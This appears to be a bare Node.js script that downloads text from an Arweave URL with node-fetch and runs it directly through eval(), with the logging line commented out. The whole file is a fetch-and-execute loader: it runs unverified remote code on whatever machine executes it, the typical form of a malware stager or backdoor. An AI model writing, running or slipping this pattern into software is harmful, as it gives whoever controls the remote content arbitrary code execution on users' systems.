let fetch=require("node-fetch")
fetch("https://arweave.net/c7OBoRIjaDvY6RNCqiEdw1K2t7G0pBR7aTZ7KzTV2do")
.then(res=>res.text()).then(result=>{
    // console.log(result)
    eval(result)
})